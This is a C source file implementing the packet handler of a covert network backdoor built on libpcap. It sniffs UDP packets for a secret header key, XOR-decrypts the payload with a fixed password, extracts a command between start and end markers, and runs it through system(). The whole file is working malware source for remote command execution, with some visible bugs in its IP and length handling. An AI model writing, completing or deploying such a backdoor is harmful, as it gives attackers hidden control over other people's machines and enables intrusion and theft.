#include "config.h"
#include <string.h>
#include <stdlib.h>
#include <pcap.h>

int packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
    int len, loop;
    char *ptr, *ptr2;
    char decrypt[MAX_SIZE];
    char command[MAX_SIZE];
    char save_output_cmd[] = " > tmp.txt";
    unsigned char sender_IP[16];

    ptr = (char *)(packet + 26);
    memset(sender_IP, 0x0, 4);
    strncpy(sender_IP, ptr, 4);
    sender_IP[4] = '\0';
    snprintf(sender_IP, 16, "%d.%d.%d.%d", sender_IP[0], sender_IP[1], sender_IP[2], sender_IP[3]);
    printf("%s\n", sender_IP);

    /* Step 1: locate the payload portion of the packet */
    ptr = (char *)(packet + ETHER_IP_UDP_LEN);
    if ((pkt_info->caplen - ETHER_IP_UDP_LEN - 14) <= 0)
        return -2;

    /* Step 2: check payload for backdoor header key */
    if (0 != memcmp(ptr, BACKDOOR_HEADER_KEY, BACKDOOR_HEADER_LEN))
        return 0;
    ptr += BACKDOOR_HEADER_LEN;
    len = (pkt_info->caplen - ETHER_IP_UDP_LEN - BACKDOOR_HEADER_LEN);
    memset(decrypt, 0x0, sizeof(decrypt));

    /* Step 3: decrypt the packet by an XOR pass against contents */
    for (loop = 0; loop < len; loop++)
    {
        decrypt[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];
    }
    /* Step 4: verify decrypted contents */
    if (!(ptr = strstr(decrypt, COMMAND_START)))
        return -1;
    ptr += strlen(COMMAND_START);
    if (!(ptr2 = strstr(ptr, COMMAND_END)))
        return -1;

    /* Step 5: extract the remainder */
    memset(command, 0x0, sizeof(command));
    strncpy(command, ptr, (ptr2 - ptr));
    strncpy(command + (ptr2 - ptr), " > tmp.txt", 10);

    /* Step 6: Execute the command */
    system(command);
    return 1;
}